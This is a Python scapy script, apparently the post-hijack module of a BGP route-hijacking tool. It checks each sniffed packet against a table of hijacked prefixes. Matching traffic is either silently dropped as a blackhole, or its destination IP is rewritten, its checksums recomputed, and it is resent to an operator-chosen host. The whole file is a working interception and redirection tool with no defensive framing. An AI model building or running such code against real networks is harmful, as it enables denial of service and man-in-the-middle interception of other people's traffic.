from scapy.all import send, IP, TCP, UDP    
from misc.grab_config import get_config
from misc.get_route import dig_RIB
from misc.logging import handle_log


def is_hijacked(dst_ip: str) -> bool:
    """
    checks if destination IP falls within any hijacked prefix in rib
    """
    result = dig_RIB(dst_ip)
    return result is not None


def get_routing_handler():
    """
    Intercepts traffic destined for hijacked prefixes and either:
    - Blackholes it (pe_route_dest=0.0.0.0)
    - Forwards it to a custom destination (pe_route_dest=<ip>)
    """

    config = get_config(["route_dest_ip", "iface"])
    pe_route_dest = config["route_dest_ip"]
    iface = config["iface"]
    is_blackhole = pe_route_dest == "0.0.0.0"

    if is_blackhole:
        print(f"[*] Mode: BLACKHOLE — intercepted traffic will be dropped")
    else:
        print(f"[*] Mode: FORWARD — intercepted traffic will be sent to {pe_route_dest}")

    print(f"[*] Listening on interface: {iface}")
    print(f"[*] Press Ctrl+C to stop\n")

    handle_log(f"pe_routing started — mode: {'blackhole' if is_blackhole else pe_route_dest}", "pe.log")

    def process_packet(pkt):

        if IP not in pkt:
            return

        dst = pkt[IP].dst
        src = pkt[IP].src

        if not is_hijacked(dst):
            return

        route = dig_RIB(dst)
        prefix = route.get("prefix", "unknown")

        if is_blackhole:
            print(f"[+] BLACKHOLE: {src} -> {dst} (prefix: {prefix}) — dropped")
            handle_log(f"BLACKHOLE: {src} -> {dst} (prefix: {prefix})", "pe.log")
            # no forwarding, just drop the packet by not sending it

        else:
            print(f"[+] FORWARD: {src} -> {dst} redirected to {pe_route_dest} (prefix: {prefix})")
            handle_log(f"FORWARD: {src} -> {dst} -> {pe_route_dest} (prefix: {prefix})", "pe.log")

            # rewrite destination and recalculate checksums
            pkt[IP].dst = pe_route_dest
            del pkt[IP].chksum

            if TCP in pkt:
                del pkt[TCP].chksum
            elif UDP in pkt:
                del pkt[UDP].chksum

            send(pkt, iface=iface, verbose=False)

    return process_packet
